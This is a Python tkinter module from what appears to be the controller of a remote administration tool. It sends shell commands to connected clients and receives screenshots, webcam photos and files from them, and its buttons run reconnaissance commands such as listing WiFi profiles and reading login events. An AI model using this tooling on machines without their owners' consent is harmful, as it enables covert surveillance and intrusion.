"""
gui_commands.py - Command Execution & Quick Command Buttons
"""
import socket
import threading
import time
import json
import tkinter as tk
from tkinter import messagebox
import gui_globals as g


def log_message(message, level="INFO"):
    g.log_message(message, level)


def execute_command(cmd, cmd_name):
    """Execute command on active client — runs in background thread."""
    conn = None
    client_hostname = "Unknown"
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "\n❌ ERROR: No active client\n\n", "error"))
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt"))
                g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))
                return
            conn = g.clients[g.active_client_id]["conn"]
            client_hostname = g.clients[g.active_client_id].get("info", {}).get("hostname", "Unknown")

        conn.settimeout(1.0)
        log_message(f"Executing: {cmd}", "INFO")
        conn.send(cmd.encode())

        if cmd.lower() == "exit":
            g.root.after(0, lambda: g.terminal_output.insert(tk.END, "\n✓ Disconnecting...\n\n", "success"))
            import gui_network as net
            g.root.after(0, net.disconnect_active_client)
            return

        all_data = b""
        chunk_count = 0
        max_chunks = 200
        start_time = time.time()
        last_update = time.time()

        is_special_cmd = cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM"))
        max_timeout = 15.0 if cmd.upper() in ("SCREENSHOT", "WEBCAM") else 5.0
        if cmd.upper() in ("SCREENSHOT", "WEBCAM"):
            max_chunks = 500

        while chunk_count < max_chunks:
            try:
                if time.time() - start_time > max_timeout:
                    log_message(f"Command timed out after {max_timeout}s (chunks: {chunk_count})", "WARNING")
                    break
                chunk = conn.recv(8192)
                if not chunk:
                    break
                all_data += chunk
                chunk_count += 1

                if not is_special_cmd and chunk:
                    try:
                        decoded = chunk.decode(errors="ignore")
                        if "}" in decoded:
                            decoded = decoded.replace("\n}", "").replace("}", "")
                        if decoded:
                            g.root.after(0, lambda t=decoded: g.terminal_output.insert(tk.END, t, "output"))
                            g.root.after(0, lambda: g.terminal_output.see(tk.END))
                    except Exception as e:
                        pass

                if time.time() - last_update > 0.05:
                    g.root.after(0, lambda: g.root.update_idletasks())
                    last_update = time.time()

                if b'}' in chunk:
                    break

            except socket.timeout:
                # Instead of breaking, just continue until max_timeout
                continue
            except Exception as e:
                log_message(f"Receive error: {e}", "ERROR")
                break

        output = all_data.decode(errors="ignore")

        if is_special_cmd:
            _handle_special_response(output)

        log_message(f"Completed: {cmd}", "SUCCESS")

    except socket.error as e:
        err_msg = str(e)
        g.root.after(0, lambda m=err_msg: g.terminal_output.insert(tk.END, f"\n❌ SOCKET ERROR: {m}\n", "error"))
        log_message(f"Socket error on {client_hostname}: {err_msg}", "ERROR")
        import gui_network as net
        g.root.after(100, net.disconnect_active_client)
    except Exception as e:
        err_msg = str(e)
        g.root.after(0, lambda m=err_msg: g.terminal_output.insert(tk.END, f"\n❌ ERROR: {m}\n", "error"))
        log_message(f"Command failed on {client_hostname}: {err_msg}", "ERROR")
    finally:
        # MUST use root.after() — this runs in a background thread, never call tkinter directly!
        def _restore_prompt():
            try:
                g.terminal_output.insert(tk.END, "\nRemote-Admin> ", "prompt")
                g.terminal_output.mark_set("input_start", "end-1c")
                g.terminal_output.mark_gravity("input_start", "left")
                g.terminal_output.see(tk.END)
            except Exception:
                pass
        g.root.after(50, _restore_prompt)


def _handle_special_response(output):
    """Parse and display JSON responses from special commands."""
    import gui_features as feat
    try:
        json_start = output.find('{')
        json_end = output.rfind('}')
        if json_start == -1 or json_end == -1:
            if output.strip():
                g.root.after(0, lambda t=output: g.terminal_output.insert(tk.END, t + "\n", "output"))
            return
        response = json.loads(output[json_start:json_end+1])
        resp_type = response.get("type", "")

        if resp_type == "SCREENSHOT":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.show_screenshot(response.get("data")))
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "✓ Screenshot captured\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ {m}\n", "error"))

        elif resp_type == "DOWNLOAD":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.save_downloaded_file(response.get("filename"), response.get("data")))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ {m}\n", "error"))

        elif resp_type == "SYSINFO":
            formatted = json.dumps(response, indent=2)
            g.root.after(0, lambda t=formatted: g.terminal_output.insert(tk.END, t + "\n", "output"))

        elif resp_type == "UPLOAD":
            if response.get("status") == "success":
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ {m}\n", "error"))

        elif resp_type == "WEBCAM":
            if response.get("status") == "success":
                g.root.after(0, lambda: feat.show_webcam_photo(response.get("data"), response.get("resolution", "?")))
                g.root.after(0, lambda: g.terminal_output.insert(tk.END, f"✓ Webcam captured ({response.get('resolution','?')})\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Webcam failed: {m}\n", "error"))

        elif resp_type == "POPUP":
            if response.get("status") == "success":
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
            else:
                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Popup failed: {m}\n", "error"))

    except json.JSONDecodeError:
        if output.strip():
            g.root.after(0, lambda t=output: g.terminal_output.insert(tk.END, t + "\n", "output"))
    except Exception as e:
        log_message(f"JSON handler error: {e}", "ERROR")


def send_command_from_button(cmd, cmd_name):
    """Send command from any button click."""
    try:
        with g.clients_lock:
            if not g.active_client_id or g.active_client_id not in g.clients:
                messagebox.showerror("No Client", "Please select a client first!")
                return
        if g.terminal_output.cget("state") == "disabled":
            return
        try:
            g.terminal_output.delete("input_start", "end")
            g.terminal_output.insert(tk.END, f"{cmd}\n", "command")
            g.terminal_output.mark_set("input_start", "end-1c")
            g.terminal_output.see(tk.END)
        except tk.TclError as e:
            log_message(f"Terminal update error: {e}", "ERROR")
            return
        threading.Thread(target=execute_command, args=(cmd, cmd_name), daemon=True, name=f"BtnCmd-{cmd[:15]}").start()
    except Exception as e:
        log_message(f"Error in send_command_from_button: {e}", "ERROR")


def update_commands_for_client_os(client_os):
    """Rebuild quick command buttons with full categorized coverage for all OS."""
    for widget in g.commands_container.winfo_children():
        widget.destroy()
    g.command_buttons.clear()

    is_windows = "windows" in client_os.lower()
    is_linux   = "linux"   in client_os.lower()
    is_mac     = "darwin"  in client_os.lower() or "mac" in client_os.lower()

    def section(title, color):
        """Add a coloured section header."""
        tk.Label(
            g.commands_container, text=f"  {title}",
            font=("Segoe UI", 9, "bold"), bg=color, fg="white",
            anchor="w", padx=6, pady=4
        ).pack(fill="x", pady=(8, 2))

    def btn(label, cmd, icon, color):
        b = tk.Button(
            g.commands_container,
            text=f"{icon}  {label}",
            command=lambda c=cmd, t=label: send_command_from_button(c, t),
            font=("Segoe UI", 10, "bold"),
            bg=color, fg="white",
            relief="flat", padx=14, pady=9,
            cursor="hand2",
            state="normal" if g.active_client_id else "disabled",
            anchor="w",
            activebackground=color, activeforeground="white"
        )
        b.pack(fill="x", pady=2)
        g.command_buttons.append(b)

    # ─────────────────────────── WINDOWS ──────────────────────────────────────
    if is_windows:
        section("🌐  NETWORK & SECURITY", "#1565C0")
        btn("Wifi Profiles",              "netsh wlan show profiles",     "📶", "#0277BD")
        btn("Open Ports",                 "netstat -ano | findstr LISTEN","🔌", "#00695C")
        btn("Firewall Status",            "netsh advfirewall show allprofiles", "🔥", "#BF360C")
        btn("Recent Logins",              "wevtutil qe Security /q:*[System[EventID=4624]] /c:5 /f:text", "🔑", "#F9A825")

        section("💻  SYSTEM & HARDWARE", "#1B5E20")
        btn("Full System Info",           "systeminfo",                   "💻", "#388E3C")
        btn("CPU & RAM Info",             "wmic cpu get name && wmic memorychip get capacity", "⚙️", "#558B2F")
        btn("Installed Programs",         "wmic product get name,version", "📦", "#F57F17")

        section("🎯  PROCESS & SERVICES", "#4A148C")
        btn("Top Memory Usage",           "wmic process get name,workingsetsize | sort", "📈", "#8E24AA")
        btn("Running Services",           "sc query type= all state= running",           "⚙️", "#00838F")
        btn("Scheduled Tasks",            "schtasks /query /fo LIST",           "📅", "#F57C00")

    # ─────────────────────────── LINUX / MAC ──────────────────────────────────
    elif is_linux or is_mac:
        section("🌐  NETWORK & SECURITY", "#1565C0")
        btn("Open Ports (Listen)",        "netstat -tulnp",               "🔌", "#546E7A")
        btn("SSH Config",                 "cat /etc/ssh/sshd_config | grep -v '#'", "🔑", "#0277BD")
        btn("Firewall Rules",             "iptables -L -n 2>/dev/null || ufw status", "🔥", "#BF360C")
        btn("Login History",              "last | head -20",              "📅", "#F57C00")

        section("💻  SYSTEM & HARDWARE", "#1B5E20")
        btn("System Logs (tail)",         "tail -n 30 /var/log/syslog 2>/dev/null || journalctl -n 30", "📋", "#4527A0")
        btn("Disk Usage (folders)",       "du -sh /*",                    "💾", "#7B1FA2")
        btn("Installed Packages",         "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null | head -30", "📦", "#F57F17")

        section("🎯  PROCESS & SERVICES", "#4A148C")
        btn("Memory Hogs",                "ps aux --sort=-%mem | head -10","🧠", "#8E24AA")
        btn("CPU Hogs",                   "ps aux --sort=-%cpu | head -10","⚙️", "#00838F")
        btn("Running Services",           "systemctl list-units --type=service --state=running 2>/dev/null | head -20", "🔄", "#4CAF50")

    # ─────────────────────────── GENERIC ──────────────────────────────────────
    else:
        section("💻  SYSTEM & NETWORK", "#1B5E20")
        btn("System Info",                "systeminfo",                   "💻", "#388E3C")
        btn("Running Processes",          "tasklist",                     "📊", "#6A1B9A")
        btn("Net Connections",            "netstat -an",                  "🔌", "#546E7A")

    for abtn in g.advanced_buttons:
        abtn.config(state="normal")
    log_message(f"Commands loaded for: {client_os}", "INFO")





def confirm_system_command(cmd, name):
    if messagebox.askyesno("⚠️ Confirm", f"Execute on client:\n\n{name}\n\nThis will affect the client immediately!"):
        send_command_from_button(cmd, name)


def prompt_process_operation(cmd_prefix, operation_name):
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    dialog = tk.Toplevel(g.root)
    dialog.title(operation_name)
    dialog.geometry("500x200")
    dialog.configure(bg="#FFFFFF")
    dialog.resizable(False, False)
    dialog.transient(g.root)
    dialog.grab_set()

    tk.Label(dialog, text=operation_name, font=("Segoe UI", 14, "bold"), bg="#FFFFFF", fg="#1976D2").pack(pady=20)
    input_frame = tk.Frame(dialog, bg="#FFFFFF")
    input_frame.pack(fill="x", padx=40, pady=10)

    label_text = "Process Name:" if "Find" in operation_name else "Process Name (e.g., notepad.exe):"
    tk.Label(input_frame, text=label_text, font=("Segoe UI", 11), bg="#FFFFFF", fg="#424242").pack(anchor="w", pady=(0, 5))
    entry = tk.Entry(input_frame, font=("Segoe UI", 11), width=40, relief="solid", borderwidth=1)
    entry.pack(fill="x", pady=5, ipady=5)
    entry.focus()

    def execute():
        name = entry.get().strip()
        if name:
            if "Kill" in operation_name:
                if not messagebox.askyesno("Confirm", f"Kill process: {name}?"):
                    return
            send_command_from_button(f"{cmd_prefix} {name}", f"{operation_name}: {name}")
            dialog.destroy()

    btn_frame = tk.Frame(dialog, bg="#FFFFFF")
    btn_frame.pack(pady=20)
    tk.Button(btn_frame, text="✓ Execute", command=execute, font=("Segoe UI", 11, "bold"), bg="#4CAF50", fg="white", relief="flat", padx=30, pady=10, cursor="hand2").pack(side="left", padx=8)
    tk.Button(btn_frame, text="✗ Cancel", command=dialog.destroy, font=("Segoe UI", 11), bg="#757575", fg="white", relief="flat", padx=30, pady=10, cursor="hand2").pack(side="left", padx=8)
    entry.bind("<Return>", lambda e: execute())
